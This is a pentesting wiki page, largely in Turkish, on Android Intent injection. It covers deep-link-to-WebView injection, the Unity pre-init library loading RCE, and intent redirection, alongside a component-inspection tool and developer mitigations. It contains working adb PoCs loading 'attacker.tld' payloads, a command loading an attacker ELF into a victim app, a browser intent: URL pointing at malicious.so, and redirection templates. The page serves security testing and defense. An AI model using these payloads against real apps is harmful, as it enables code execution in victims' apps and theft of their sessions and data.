# Intent Injection

{{#include ../../banners/hacktricks-training.md}}

Intent injection, saldırgan kontrollü Intents kabul eden veya daha sonra Intents'e dönüştürülen verileri kötüye kullanır. Android app pentests sırasında çok yaygın iki desen şunlardır:

- Hazırlanmış extras'ları exported Activities/Services/BroadcastReceivers'a gönderip bunların daha sonra privileged, non-exported bileşenlere iletilmesi.
- exported VIEW/BROWSABLE deep link'leri tetikleyerek saldırgan kontrollü URL'leri internal WebViews veya diğer hassas sink'lere ileten akışları başlatmak.

## Deep links → WebView sink (URL parameter injection)

If an app exposes a custom scheme deep link such as:
```text
myscheme://com.example.app/web?url=<attacker_url>
```
ve alıcı Activity `url` sorgu parametresini bir WebView'e iletirse, uygulamanın kendi WebView bağlamında herhangi bir uzak içeriği görüntülemesini zorlayabilirsiniz.

PoC adb ile:
```bash
# Implicit VIEW intent
adb shell am start -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"

# Or explicitly target an Activity
adb shell am start -n com.example/.MainActivity -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"
```
Impact
- HTML/JS uygulamanın WebView profili içinde çalıştırılır.
- Eğer JavaScript etkinse (varsayılan olarak veya kontrollerin yanlış sıralanması nedeniyle), ortaya çıkan herhangi bir `@JavascriptInterface` nesnesini sıralayabilir/kullanabilir, WebView çerezlerini/local storage'ı çalabilir ve pivot yapabilirsiniz.

See also:

{{#ref}}
webview-attacks.md
{{#endref}}

## Kontrollerin sıralama hatası ile JavaScript'in etkinleştirilmesi

Tekrarlayan bir hata, son URL allowlist/doğrulama bitmeden önce JavaScript'in (veya diğer gevşek WebView ayarlarının) etkinleştirilmesidir. Eğer erken yardımcılar deep link'inizi kabul eder ve önce WebView yapılandırılırsa, son yükleme JavaScript zaten etkin olarak gerçekleşir; sonrasında yapılan kontroller hatalı veya çok geç olsa bile.

Decompiled kodda nelere bakmalı:
- URL'yi farklı şekilde parse/split/rebuild eden birden fazla yardımcı (tutarsız normalizasyon).
- Son host/path allowlist kontrolünden önce `getSettings().setJavaScriptEnabled(true)` çağrıları.
- Aşağıdakine benzer bir pipeline: parse → partial validate → configure WebView → final verify → loadUrl.

Mitigations
- URL'leri bir kez kanonikleştirip sıkı şekilde doğrulayın; kapalı başarısız ol.
- Tüm kontroller geçtikten ve güvenilir içeriği yüklemeden hemen önce JavaScript'i etkinleştirin.
- Güvenilmeyen origin'lere köprüler açmaktan kaçının.

## Unity Runtime: Intent-to-CLI extras → pre-init native library injection (RCE)

Unity tabanlı Android uygulamaları genellikle giriş Activity'si olarak `com.unity3d.player.UnityPlayerActivity` (veya `UnityPlayerGameActivity`) kullanır. Unity’nin Android template'i, `unity` adındaki özel bir Intent extra'sını Unity runtime için komut satırı flag'leri dizisi olarak değerlendirir. Entry Activity export edildiğinde (birçok template'te varsayılan), herhangi bir yerel uygulama — ve bazen `BROWSABLE` varsa bir web sitesi — bu extra'yı sağlayabilir.

Belgelendirilmemiş tehlikeli bir flag, çok erken süreç başlatma aşamasında native kod çalıştırılmasına yol açar:

- Hidden flag: `-xrsdk-pre-init-library <absolute-path>`
- Effect: `dlopen(<absolute-path>, RTLD_NOW)` init aşamasında çok erken çalıştırılır, hedef uygulamanın sürecine saldırgan kontrollü bir ELF yükler ve uygulamanın UID ve izinleriyle çalıştırır.

Reverse-engineering excerpt (simplified):
```c
// lookup the arg value
initLibPath = FUN_00272540(uVar5, "xrsdk-pre-init-library");
// load arbitrary native library early
lVar2 = dlopen(initLibPath, 2); // RTLD_NOW
```
Neden işe yarar
- Intent extra `unity` Unity runtime bayraklarına ayrıştırılır.
- pre-init flag'ini sağlamak, Unity'yi izin verilen linker namespace path içinde saldırgan kontrollü bir ELF yoluna yönlendirir (aşağıdaki kısıtlamalara bakın).

İstismar için koşullar
- Unity giriş Activity'si exported olarak ayarlanmıştır (varsayılan olarak genellikle true).
- Tarayıcı üzerinden tek tıklamayla uzaktan için: giriş Activity ayrıca `android.intent.category.BROWSABLE` bildirir, böylece extras bir `intent:` URL'sinden geçebilir.

Yerel istismar (aynı cihaz)
1) Bir payload ELF'i hedef uygulamanın okuyabileceği bir yola yerleştirin. En kolay: kendi saldırgan uygulamanızda kötü amaçlı bir kütüphane paketleyin ve saldırganın manifestinde ayarlayarak bunun `/data/app/.../lib/<abi>/` altında çıkarıldığından emin olun:
```xml
<application android:extractNativeLibs="true" ...>
```
2) CLI pre-init flag'ını `unity` extra'sında kullanarak hedefin Unity aktivitesini başlatın. Örnek ADB PoC:
```bash
adb shell am start \
-n com.victim.pkg/com.unity3d.player.UnityPlayerActivity \
-e unity "-xrsdk-pre-init-library /data/app/~~ATTACKER_PKG==/lib/arm64/libpayload.so"
```
3) Unity calls `dlopen("/data/.../libpayload.so", RTLD_NOW)`; payload'ınız hedef işlemde çalışır, uygulamanın tüm izinlerini (camera/mic/network/storage, vb.) miras alır ve uygulama içi oturumlara/verilere erişim sağlar.

Notes
- Tam `/data/app/...` yolu cihazlar/kurulumlar arasında değişir. Bir saldırgan uygulama kendi native lib dizinini çalışma zamanında `getApplicationInfo().nativeLibraryDir` ile alıp tetikleyiciye iletebilir.
- Dosyanın `.so` ile bitmesi gerekmez eğer geçerli bir ELF ise — `dlopen()` uzantılara değil ELF başlıklarına bakar.

Remote one‑click via browser (conditional)
Eğer Unity giriş activity'si `BROWSABLE` olarak export edilmişse, bir web sitesi ekstraları bir `intent:` URL'si aracılığıyla iletebilir:
```text
intent:#Intent;package=com.example.unitygame;scheme=whatever;\
S.unity=-xrsdk-pre-init-library%20/data/local/tmp/malicious.so;end;
```
Ancak modern Android'de dinamik bağlayıcı ad alanları ve SELinux birçok genel yoldan (ör. `/sdcard/Download`) yüklemeyi engeller. Aşağıdaki gibi hatalar göreceksiniz:
```
library "/sdcard/Download/libtest.so" ("/storage/emulated/0/Download/libtest.so") needed
or dlopened by "/data/app/.../lib/arm64/libunity.so" is not accessible for the
namespace: [name="clns-...", ... permitted_paths="/data:/mnt/expand:/data/data/com.example.unitygame"]
```
Atlatma stratejisi: özel depolamalarında saldırgan tarafından kontrol edilen baytları önbelleğe alan uygulamaları hedefleyin (ör. HTTP önbellekleri). İzin verilen yollar `/data` ve uygulamanın private dir`ini` içerdiğinden, `-xrsdk-pre-init-library`'yi uygulamanın önbelleği içindeki mutlak bir yola işaret ettirmek linker kısıtlamalarını karşılayabilir ve kod yürütmesi sağlayabilir. Bu, diğer Android uygulamalarında daha önce gözlemlenmiş cache-to-ELF RCE desenlerini yansıtır.

## Other classic Intent injection primitives

- startActivity/sendBroadcast, saldırgan tarafından sağlanan `Intent` extras'larının daha sonra yeniden ayrıştırılıp (`Intent.parseUri(...)`) yürütülmesi.
- İzin kontrolleri olmadan Intents'i non-exported hassas bileşenlere ileten exported proxy bileşenler.

---

## Automating exported-component testing (Smali-driven ADB generation)

Exported bileşenler belirli extras beklediğinde, payload yapısını tahmin etmek zaman kaybına ve yanlış negatiflere yol açar. Anahtarları/tipleri doğrudan Smali'den otomatik keşfedebilir ve çalıştırmaya hazır adb komutları üretebilirsiniz.

Tool: APK Components Inspector
- Repo: https://github.com/thecybersandeep/apk-components-inspector
- Approach: Smali'yi decompile edip `getStringExtra("key")`, `getIntExtra("id", ...)`, `getParcelableExtra("redirect_intent")`, `getSerializableExtra(...)`, `getBooleanExtra(...)`, `getAction()`, `getData()` gibi çağrıları tarayarak her bileşenin hangi extras ve alanları tükettiğini çıkarır.
- Output: her exported Activity/Service/Receiver/Provider için araç kısa bir açıklama ve doğru tiplenmiş bayraklarla tam `adb shell am ...`/`cmd content ...` komutunu yazdırır.

Kurulum
```bash
git clone https://github.com/thecybersandeep/apk-components-inspector
cd apk-components-inspector
python3 -m venv venv && source venv/bin/activate
pip install androguard==3.3.5 rich
```
Kullanım
```bash
python apk-components-inspector.py target.apk
```
Örnek çıktı
```bash
adb shell am start -n com.target/.ExportedActivity --es url https://example.tld
adb shell am startservice -n com.target/.ExportedService --ei user_id 1337 --ez force true
adb shell am broadcast -n com.target/.ExportedReceiver -a com.target.ACTION --es redirect_intent "intent:#Intent;component=com.target/.Internal;end"
adb shell cmd content query --uri content://com.target.provider/items
```
ADB am extras hızlı referans (tür-duyarlı bayraklar)
- Stringler: `--es key value` | String dizisi: `--esa key v1,v2`
- Tam sayılar: `--ei key 123` | Int dizisi: `--eia key 1,2,3`
- Boolean'lar: `--ez key true|false`
- Long'lar: `--el key 1234567890`
- Float'lar: `--ef key 1.23`
- URI'ler (extra): `--eu key content://...` | Data URI (Intent data): `-d content://...`
- Bileşen extra: `--ecn key com.pkg/.Cls`
- Null string extra: `--esn key`
- Yaygın bayraklar: `-a <ACTION>` `-c <CATEGORY>` `-t <MIME>` `-f <FLAGS>` `--activity-clear-task --activity-new-task`

Pro ipuçları Providers için
- Agent kullanmadan ContentProviders'e erişmek için `adb shell cmd content query|insert|update|delete ...` kullanın.
- SQLi denemesi için, altta yatan provider SQLite-backed ise `--projection` ve `--where` (aka selection) parametrelerini değiştirin.

Tam uçtan uca otomasyon (interactive executor)
```bash
# generate and capture commands then execute them one by one interactively
python apk-components-inspector.py app.apk | tee adbcommands.txt
python run_adb_commands.py
```
Yardımcı betik (satır devamlarını birleştirir, yalnızca `adb` ile başlayan satırları çalıştırır):
```python
import subprocess

def parse_adb_commands(file_path):
with open(file_path, 'r') as file:
lines = file.readlines()
commands = []
current = []
for line in lines:
s = line.strip()
if s.startswith("adb "):
current = [s]
elif s.startswith("#") or not s:
if current:
full = ' '.join(current).replace(" \\ ", " ").replace("\\", "").strip()
commands.append(full)
current = []
elif current:
current.append(s)
if current:
full = ' '.join(current).replace(" \\ ", " ").replace("\\", "").strip()
commands.append(full)
return commands

for i, cmd in enumerate(parse_adb_commands('adbcommands.txt'), 1):
print(f"\nCommand {i}: {cmd}")
input("Press Enter to execute this command...")
try:
r = subprocess.run(cmd, shell=True, check=True, text=True, capture_output=True)
print("Output:\n", r.stdout)
if r.stderr:
print("Errors:\n", r.stderr)
except subprocess.CalledProcessError as e:
print(f"Command failed with error:\n{e.stderr}")
```
Cihaz üzerinde çalıştırın: inspector Python tabanlıdır ve `apktool`/`androguard` mevcutsa Termux veya root'lu telefonlarda çalışır.

---

## Intent Redirection (CWE-926) – bulma ve istismar

Kalıp
- Export edilmiş bir giriş noktası (Activity/Service/Receiver) gelen bir Intent'i okur ve kaynağı/veriyi doğrulamadan dahili veya harici olarak iletir, örn:
- `startActivity(getIntent())`
- `startActivity(intent)` burada `intent`, `redirect_intent`/`next_intent`/`pending_intent` gibi bir extra'dan veya `Intent.parseUri(...)`'dan gelmiştir.
- `action`/`data`/`component` alanlarına kontrol olmadan güvenmek; çağıran kimliğini doğrulamamak.

Smali/Java'da aranacaklar
- `getParcelableExtra("redirect_intent")`, `getParcelable("intent")`, `getIntent().getParcelableExtra(...)` kullanımları.
- Saldırgan tarafından etkilenmiş Intent'ler üzerinde doğrudan `startActivity(...)`, `startService(...)`, `sendBroadcast(...)`.
- `getCallingPackage()`/`getCallingActivity()` kontrollerinin veya özel izin kontrollerinin eksikliği.

ADB PoC şablonları
- Proxy Activity'nin ayrıcalıklı dahili bir Activity'ye ekstra bir Intent iletmesi:
```bash
adb shell am start -n com.target/.ProxyActivity \
--es redirect_intent 'intent:#Intent;component=com.target/.SensitiveActivity;end'
```
- `redirect_intent` parcelable'ını dikkate alan dışa açık Service:
```bash
adb shell am startservice -n com.target/.ExportedService \
--es redirect_intent 'intent:#Intent;component=com.target/.PrivService;action=com.target.DO;end'
```
- Dışa açılmış Receiver, doğrulama yapmadan iletir:
```bash
adb shell am broadcast -n com.target/.RelayReceiver -a com.target.RELAY \
--es forwarded 'intent:#Intent;component=com.target/.HiddenActivity;S.extra=1;end'
```
singleTask tarzı davranış için yararlı bayraklar
```bash
# Ensure a fresh task when testing Activities that check task/intent flags
adb shell am start -n com.target/.ExportedActivity --activity-clear-task --activity-new-task
```
Gerçek dünya örnekleri (etki değişir):
- CVE-2024-26131 (Element Android): export edilmiş akışlar WebView manipülasyonuna, PIN atlamasına ve oturum ele geçirmeye yol açtı.
- CVE-2023-44121 (LG ThinQ Service): export edilmiş receiver action `com.lge.lms.things.notification.ACTION` → sistem düzeyinde etkiler.
- CVE-2023-30728 (Samsung PackageInstallerCHN < 13.1.03.00): yönlendirme → rastgele dosya erişimi (kullanıcı etkileşimiyle).
- CVE-2022-36837 (Samsung Email < 6.1.70.20): implicit Intents içeriği leak ediyor.
- CVE-2021-4438 (React Native SMS User Consent).
- CVE-2020-14116 (Xiaomi Mi Browser).

Mitigations (developer checklist)
- Gelen Intents'i doğrudan iletme; izin verilen alanları doğrula, temizle ve yeniden oluştur.
- Gerekmiyorsa `android:exported="false"` ile dışa açmayı kısıtlayın. Dışa açılan bileşenleri izinler ve imzalarla koruyun.
- Çağıran kimliğini doğrulayın (`getCallingPackage()`/`getCallingActivity()`), ve uygulama içi gezinme için explicit Intents uygulayın.
- `action` ve `data` (scheme/host/path) alanlarını kullanmadan önce doğrulayın; güvenilmeyen girdilerde `Intent.parseUri` kullanmaktan kaçının.

---

## Referanslar

- [Android – Access to app-protected components](https://blog.oversecured.com/Android-Access-to-app-protected-components/)
- [Samsung S24 Exploit Chain Pwn2Own 2024 Walkthrough](https://medium.com/@happyjester80/samsung-s24-exploit-chain-pwn2own-2024-walkthrough-c7a3da9a7a26)
- [Pwn2Own Ireland 2024 – Samsung S24 attack chain (whitepaper)](https://maliciouserection.com/2025/05/13/pwn2own-ireland-2024-samsung-s24-attack-chain-whitepaper.html)
- [Demonstration video](https://www.youtube.com/watch?v=LAIr2laU-So)
- [Automating Android App Component Testing with New APK Inspector (blog)](https://www.mobile-hacker.com/2025/09/18/automating-android-app-component-testing-with-new-apk-inspector/)
- [APK Components Inspector – GitHub](https://github.com/thecybersandeep/apk-components-inspector)
- [Google guidance on intent redirection](https://support.google.com/faqs/answer/9267555?hl=en)
- [OVAA vulnerable app](https://github.com/oversecured/ovaa)
- [Exported Service PoC APK](https://github.com/nhattm3006/android-poc/blob/main/Exported%20Service/poc.apk)
- [Ostorlab – 100M installs image app deep dive (component summary example)](https://medium.com/@ostorlab/this-article-is-a-technical-deep-dive-showing-how-a-100m-installation-image-application-can-6343ce8ea076)
- [CVE-2024-26131 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2024-26131)
- [CVE-2023-44121 – CVE.org](https://www.cve.org/CVERecord?id=CVE-2023-44121)
- [CVE-2023-30728 – CVE.org](https://www.cve.org/CVERecord?id=CVE-2023-30728)
- [CVE-2022-36837 – CVE.org](https://www.cve.org/CVERecord?id=CVE-2022-36837)
- [CVE-2021-4438 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2021-4438)
- [CVE-2020-14116 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2020-14116)
- [CVE-2025-59489 – Arbitrary Code Execution in Unity Runtime (blog)](https://flatt.tech/research/posts/arbitrary-code-execution-in-unity-runtime/)
- [Unity docs – Android custom activity command-line](https://docs.unity3d.com/6000.0/Documentation/Manual/android-custom-activity-command-line.html)
- [Unity Security Sept-2025-01 advisory](https://unity.com/security/sept-2025-01)
- [HEXACON talk – Messenger one-click cache-based RCE pattern (slides)](https://www.hexacon.fr/slides/Calvanno-Defense_through_Offense_Building_a_1-click_Exploit_Targeting_Messenger_for_Android.pdf)

{{#include ../../banners/hacktricks-training.md}}
